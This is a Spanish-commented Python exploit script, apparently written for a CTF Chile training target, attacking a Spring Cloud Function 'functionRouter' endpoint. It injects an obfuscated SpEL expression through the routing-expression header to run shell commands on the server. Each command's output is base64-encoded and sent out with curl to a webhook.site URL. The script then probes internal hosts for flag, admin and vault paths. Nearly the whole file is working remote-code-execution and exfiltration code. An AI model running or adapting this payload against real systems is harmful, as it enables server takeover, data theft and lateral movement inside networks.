#!/usr/bin/env python3
"""
CTF Chile - Exploración de servicios internos
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Creando webhook...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    URL: {WH}")

def build_payload(shell_cmd):
    esc = shell_cmd.replace("\\", "\\\\").replace('"', '\\"')
    return (
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("exe"+"c",new String[]{}.getClass())'
        '.invoke('
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("getRunt"+"ime").invoke(null),'
        'new String[]{"/bin/sh","-c","' + esc + '"}'
        ').waitFor()'
    )

def probe(tag, cmd):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    p = build_payload(shell)
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        print(f"    [+] {tag:25} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag} error: {e}")

print("[*] Explorando servicios en 10.160.209.1...")

# Servicios en 10.160.209.1
probe("209_1_port_80", "curl -s http://10.160.209.1/ | head -20")
probe("209_1_port_8080", "curl -s http://10.160.209.1:8080/ | head -20")
probe("209_1_port_3000", "curl -s http://10.160.209.1:3000/ | head -20")
probe("209_1_port_8443", "curl -k -s https://10.160.209.1:8443/ | head -20")

print("[*] Explorando servicios en 10.160.209.2...")

# Servicios en 10.160.209.2
probe("209_2_port_80", "curl -s http://10.160.209.2/ | head -20")
probe("209_2_port_8080", "curl -s http://10.160.209.2:8080/ | head -20")
probe("209_2_port_3000", "curl -s http://10.160.209.2:3000/ | head -20")
probe("209_2_port_8443", "curl -k -s https://10.160.209.2:8443/ | head -20")

print("[*] Buscando endpoints específicos...")

# Endpoints comunes en ambos hosts
for host in ["10.160.209.1", "10.160.209.2"]:
    host_clean = host.replace(".", "_")
    probe(f"{host_clean}_flag", f"curl -s http://{host}/flag | head -10")
    probe(f"{host_clean}_api_flag", f"curl -s http://{host}/api/flag | head -10")
    probe(f"{host_clean}_admin", f"curl -s http://{host}/admin | head -10")
    probe(f"{host_clean}_vault", f"curl -s http://{host}/vault | head -10")

print("[*] Probando puertos 8080 para APIs...")

# APIs en puerto 8080
for host in ["10.160.209.1", "10.160.209.2"]:
    host_clean = host.replace(".", "_")
    probe(f"{host_clean}_8080_flag", f"curl -s http://{host}:8080/flag | head -10")
    probe(f"{host_clean}_8080_api", f"curl -s http://{host}:8080/api | head -10")
    probe(f"{host_clean}_8080_admin", f"curl -s http://{host}:8080/admin | head -10")

time.sleep(15)

# Recoger respuestas
print("[*] Recogiendo respuestas...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=35", timeout=10)
data = r.json().get("data", [])

flags_found = []

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    q = req.get("query") or {}
    raw = q.get("d")
    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    print("=" * 60)
    print("TAG:", path)
    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")
            print(decoded)

            # Buscar flags específicamente
            if "ctfchile{" in decoded.lower():
                flags_found.append(decoded)
                print("\n🚩🚩🚩 FLAG ENCONTRADO! 🚩🚩🚩")

            # Buscar cualquier información interesante
            if any(keyword in decoded.lower() for keyword in ["flag", "secret", "token", "password", "admin"]):
                print("ℹ️  Información potencialmente útil detectada")

        except Exception as e:
            print(f"(decode error) {raw[:150]}")
    else:
        print("(sin payload)")

print(f"\n[*] Manual review: https://webhook.site/#!/{UUID}")

if flags_found:
    print(f"\n🎉 TOTAL FLAGS ENCONTRADOS: {len(flags_found)}")
    for i, flag in enumerate(flags_found, 1):
        print(f"  Flag {i}: {flag}")
else:
    print("\n[*] No se encontraron flags en esta ronda - revisar webhook manualmente")